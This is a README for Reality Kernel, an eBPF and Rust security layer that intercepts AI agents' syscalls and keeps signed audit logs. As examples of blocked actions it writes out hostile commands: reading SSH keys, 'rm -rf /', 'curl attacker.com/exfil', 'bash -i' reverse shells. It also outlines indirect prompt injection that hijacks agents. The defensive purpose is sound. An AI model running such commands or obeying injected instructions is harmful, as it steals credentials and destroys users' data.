<div align="center">

<p align="center">
  <img src="assets/logo.png" alt="Reality Kernel" width="100" height="100" style="border-radius: 50%;" />
</p>

# Reality Kernel

### In-kernel eBPF runtime security barrier & deterministic execution attestation for autonomous AI agents.

**Never trust an LLM to police itself. Intercept rogue syscalls at the Linux kernel boundary in < 1ms.**

[![PyPI](https://img.shields.io/pypi/v/realitykernel?style=flat-square&color=3775A9&logo=pypi&logoColor=white)](https://pypi.org/project/realitykernel/)
[![Rust](https://img.shields.io/badge/rust-1.80%2B-orange?style=flat-square&logo=rust&logoColor=white)](https://www.rust-lang.org/)
[![eBPF / LSM](https://img.shields.io/badge/linux-5.15%2B%20(eBPF%2FLSM)-green?style=flat-square&logo=linux&logoColor=white)](https://kernel.org)
[![License](https://img.shields.io/badge/license-MIT%20OR%20Apache--2.0-blue?style=flat-square)](LICENSE)
[![CI](https://img.shields.io/github/actions/workflow/status/Keter-Lab/reality-kernel/ci.yml?branch=main&style=flat-square&label=CI)](https://github.com/Keter-Lab/reality-kernel/actions)

**[Website](https://realitykernel.dev/) · [Documentation](https://realitykernel.dev/docs) · [Architecture](#-the-solution-in-kernel-enforcement-sub-millisecond-fast-path) · [Quickstart](#-quickstart-python-sdk) · [Benchmarks](#-architectural-comparison)**

<code>pip install realitykernel</code>

<br /><br />

<img src="assets/rk-interception-demo.svg" alt="Reality Kernel eBPF Interception Demonstration" width="100%" />

<br /><br />

</div>

---

### Protect an agent in 3 lines of code:

```python
from realitykernel import RealityKernel

rk = RealityKernel(api_key="local_mode")
# Deterministic sub-millisecond pre-dispatch verification
rk.guard(action="cat ~/.ssh/id_rsa", prime_intent="Analyze public git logs")
# 🚨 ActionBlocked: Unauthorized credential access (-EPERM, prev_hash chained to local ledger)
```

---

## ◈ The Problem: AI Agents Have Root-Level Risk but Toy-Level Defenses

When you connect autonomous AI agents (Claude Computer Use, AutoGPT, CrewAI, LangChain) to a production environment, you grant them real operating system privileges: executing bash commands, reading files, modifying databases, and calling external APIs.

Most current security solutions operate at the **application layer** (prompt filtering, API proxies, LLM guardrails). This creates a fatal blind spot:

1. **Prompt Injections Bypass Text Filters:** Indirect prompt injections embedded in untrusted web pages, emails, or PDFs can hijack the LLM’s reasoning, causing it to generate malicious instructions.
2. **Text Filters Cannot Stop Linux Syscalls:** Once the agent process decides to run `rm -rf /` or `curl attacker.com/exfil`, text-based guardrails cannot block the system call from reaching the kernel.
3. **Logs are Mutable:** Compromised agent processes can erase local logs. Security teams have no cryptographic proof of what the agent actually executed.

---

## ◈ The Solution: Multi-Tier Pre-Dispatch Barrier & Kernel Telemetry

**Reality Kernel** provides defense-in-depth across userspace pre-dispatch validation, kernel-level telemetry, and cryptographic execution attestation:

1. **Deterministic Pre-Dispatch Barrier (SDK `rk.guard`):** In-memory sub-millisecond evaluation intercepts unearned writes, credential theft, and prompt injections before the agent executes the action. Operates fail-closed on verification or network errors.
2. **eBPF Kernel Telemetry & Network Interception:** Non-invasive Aya eBPF probes attach to kernel tracepoints (`sys_enter_execve`, `sys_enter_openat`, `sys_enter_unlinkat`) and cgroup socket hooks (`cgroup/connect4`, `cgroup/connect6`) to monitor host interactions and enforce network egress policies.
3. **Out-of-Band Sensor Termination (`rk-sensor`):** The host sensor daemon continuously correlates kernel execution telemetry against the policy engine, issuing an immediate out-of-band `SIGKILL` if an unvetted or diverged command executes.
4. **Cryptographic Attestation:** Every action is recorded into a rolling SHA-256 hash chain and attested with Ed25519 signatures, providing non-repudiable audit logs.

```mermaid
flowchart TD
    subgraph Userspace ["User Space (Agent Execution & Barrier)"]
        Agent["Autonomous AI Agent<br/>(CrewAI / Claude / AutoGPT / LangChain)"]
        PreBarrier["Layer 1: Deterministic Pre-Dispatch Barrier<br/>rk.guard(cmd, intent) — Fail-Closed"]
        Agent -->|"1. Proposes Action"| PreBarrier
    end

    subgraph KernelTelemetry ["Kernel & Sensor Layer (eBPF Telemetry)"]
        direction TB
        BPFProbes["Layer 2: Aya eBPF Probes & cgroup Sockets<br/>tracepoints: execve · openat · unlinkat · connect4"]
        RingBuf["BPF RingBuffer Event Stream"]
        Sensor["rk-sensor Daemon<br/>Out-of-Band Process Killer (SIGKILL)"]
        
        PreBarrier -->|"2. Dispatches Syscall"| BPFProbes
        BPFProbes -->|"Kernel Telemetry"| RingBuf
        RingBuf -->|"Stream Events"| Sensor
        Sensor -.->|"Divergence Detected"| KillAction["Terminate Rogue Agent (SIGKILL)"]
    end

    subgraph AuditLedger ["Cryptographic Attestation"]
        EdReceipt["Layer 3: Ed25519 Signed Receipt<br/>SHA-256 prev_hash Audit Chain"]
        PreBarrier -->|"Attested Record"| EdReceipt
    end
```

---

## ◈ Quickstart (Python SDK)

Install the production client package from PyPI:

```bash
pip install realitykernel
```

### 1. Guarding an Agent Action

```python
import os
from realitykernel import RealityKernel, ActionBlocked, ActionNeedsReview

# Initialize the kernel client
rk = RealityKernel(api_key=os.environ.get("RK_API_KEY", "local_mode"), agent_id="agent-01")

prime_intent = "Read application error logs in /var/log/app"
action = "cat /var/log/app/error.log"

try:
    # Deterministic pre-dispatch verification (sub-millisecond in-memory)
    verdict = rk.guard(action, prime_intent)
    print(f"Verdict: {verdict.verdict} | Latency: {verdict.latency_ms}ms")
except ActionBlocked as e:
    print(f"Blocked by Reality Kernel: {e}")
```

### 2. Non-Breaking Shadow Mode

Audit agent workflows in production without interrupting actions:

```python
rk = RealityKernel(
    api_key="local_mode",
    agent_id="test-agent",
    shadow_mode=True  # Non-blocking evaluation
)

# Divergent actions are flagged for telemetry without halting execution
verdict = rk.guard("curl https://suspicious-domain.com", "Summarize user ticket")
print(verdict.verdict)      # "BLOCK"
print(verdict.shadow_mode)  # True
```

---

## ◈ Architectural Comparison

| Dimension | App-Layer Guardrails (NeMo, Lakera, Llama Guard) | **Reality Kernel (eBPF + Rust)** |
| :--- | :--- | :--- |
| **Enforcement Point** | User-space API proxy | **Pre-Dispatch Symbolic Gate + Kernel eBPF Probes** |
| **Jailbreak Resistance** | Low (Heuristics can be bypassed) | **Deterministic** (Pre-dispatch gate + in-kernel socket denial) |
| **Latency Impact** | High (300ms – 1,000ms+ secondary LLM calls) | **Sub-Millisecond** (Local in-memory evaluation) |
| **Process Confinement** | None (Cannot block rogue bash calls) | **Deterministic cgroup / PID monitoring & Egress Blocking** |
| **Audit Integrity** | Mutable plain text logs | **SHA-256 rolling hash chain & Ed25519 signatures** |

---

## ◈ Workspace Structure & Building from Source

Reality Kernel is architected as a modular Rust workspace:

```text
reality-kernel/
├── rk-bpf/            # Kernel-space BPF programs (C, libbpf CO-RE) and the ABI header
├── rk-ebpf-common/    # Rust ABI types generated from rk-bpf/include/rk_abi.h
├── rk-engine-core/    # Superposition intent mapping & fast-path policy evaluator
├── rk-sensor/         # In-kernel ring buffer consumer & telemetry dispatcher
├── rk-policy/         # Capability manifests & manifest parsing
├── rk-signing/        # Ed25519 cryptographic attestation & SHA-256 state chaining
├── rk-types/          # Strongly-typed boundary schemas
├── sdk/               # Python client SDK (published on PyPI)
└── xtask/             # Build automation (BPF objects, embedded sensor build)
```

### Prerequisites
* Rust 1.80+ (stable), clang/LLVM, libbpf headers, libclang (for bindgen)
* Linux kernel 5.15+ with `CONFIG_BPF_LSM=y` and `CONFIG_DEBUG_INFO_BTF=y`
* Kernel support matrix verified in CI: [docs/kernel-matrix.md](docs/kernel-matrix.md)

### Compiling the Engine & Probes

```bash
# 1. Clone the repository
git clone https://github.com/Keter-Lab/reality-kernel.git
cd reality-kernel

# 2. Build user-space crates
cargo build --workspace

# 3. Build the BPF objects and a sensor with them embedded
cargo xtask build-sensor --release

# 4. Run parity and unit test suite
cargo test
```

---

## ◈ Performance & Latency Profile

Reality Kernel is designed to run in-line with autonomous agent execution loops without introducing perceptible lag:

* **Local In-Memory Evaluation:** Pre-dispatch policy evaluation runs locally in host memory, completely bypassing the 300ms–1,000ms network roundtrips required by secondary LLM-based guardrails.
* **Low-Overhead eBPF Interception:** System call probes execute inside the Linux kernel within microseconds, introducing zero perceptible penalty to host processes.
* **Non-Blocking Telemetry:** Audit events are streamed to user space via BPF ring buffers asynchronously, ensuring event capture never stalls agent task execution.

---

## ◈ Threat Model & Handled Vectors

* **Indirect Prompt Injection:** Adversary plants hidden instructions in data ingested by the agent.
* **Unauthorized File Exfiltration:** Agent attempts to read SSH keys, `.env`, or credential stores.
* **Rogue Subprocess Spawning:** Agent attempts unmanifested `curl`, `bash -i`, or reverse shells.
* **Audit Tampering:** Any unauthorized post-execution change breaks the Ed25519 `prev_hash` chain.

---

## ◈ Contributing

We welcome contributions from security researchers, systems programmers, and AI builders!
* See [CONTRIBUTING.md](CONTRIBUTING.md) for development guidelines.
* Join discussions in GitHub Issues and PRs.

---

## ◈ License

Reality Kernel is dual-licensed under:
* **Apache License, Version 2.0** ([LICENSE-APACHE](LICENSE-APACHE))
* **MIT License** ([LICENSE-MIT](LICENSE-MIT))

You may choose either license at your option.
